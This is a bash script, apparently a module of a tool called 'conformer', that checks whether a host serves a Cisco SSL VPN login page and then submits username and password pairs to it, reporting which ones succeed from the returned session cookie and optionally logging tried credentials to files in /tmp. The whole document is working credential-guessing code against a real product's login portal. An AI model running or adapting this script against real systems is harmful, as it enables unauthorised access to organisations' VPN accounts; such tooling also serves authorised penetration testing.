#!/bin/bash

check_ciscoSSLVPN(){
	check_Portal=$(wget --timeout=4 -qO- https://$1/+CSCOE+/logon.html --no-check-certificate);
	if ([ "$(echo $check_Portal | grep 'name="username"')" ] && [ "$(echo $check_Portal | grep 'name="password"')" ] && [ "$(echo $check_Portal | grep 'name="Login"')" ]) || [ $(echo "$5" | tr '[:upper:]' '[:lower:]' ) == "disable_check" ] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "disable_check" ]] ; then
		:
	else	
		echo "Either not a CiscoSSLVPN portal, or not compatible version.";
		echo "Exiting...";
		exit 1;
	fi
}

POST_ciscoSSLVPN(){
			#Curl sends POST parameters to SSLVPL Portal
			POST=$(curl -i -s -k  -X $'POST' \
			    -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H $'Referer: https://'$1'/+CSCOE+/logon.html?a0=15&a1=&a2=&a3=1' -H $'Content-Type: application/x-www-form-urlencoded' \
			    -b $'webvpnlogin=1; webvpnlogin=1; webvpnLang=en' \
			    --data-binary $'tgroup=&next=&tgcookieset=&username='$line'&password='$pass'&Login=Login' \
			    $'https://'$1'/+webvpn+/index.html');
		#If Logging is enabled loop userlist
		if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "debug" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "debug" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "debug" ]]; then
			echo "host:$1 username:$line password:$pass" >> /tmp/conformer.debug;
			echo "" >> /tmp/conformer.debug;			
			echo "$POST" >> /tmp/conformer.debug;
			echo "" >> /tmp/conformer.debug;	
			echo "" >> /tmp/conformer.debug;	
			echo "-------------------------------------------------------------" >> /tmp/conformer.debug;	
		fi
			#checks if cookies returned or left empty or if default return html presented.
			if [[ $POST != *"webvpnc=;"* ]] && [[ $POST == *"webvpnc="* ]] ; then
				echo "	$line:$pass:**Success**";
			# Logging
			if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
				echo "	$line:$pass:**Success**" >> /tmp/conformer.log;
			fi
			elif [[ $POST != *"webvpnc=;"* ]]; then
				echo "	$line:$pass:Fail --- Page not responding properly.";
			if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
				echo "	$line:$pass:Fail --- Page not responding properly." >> /tmp/conformer.log;
			fi
			else
				echo "	$line:$pass:Fail";
			if [[ $(echo "$5" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$6" | tr '[:upper:]' '[:lower:]') == "log" ]] || [[ $(echo "$7" | tr '[:upper:]' '[:lower:]') == "log" ]]; then
				echo "	$line:$pass:Fail" >> /tmp/conformer.log;
			fi
			fi
}
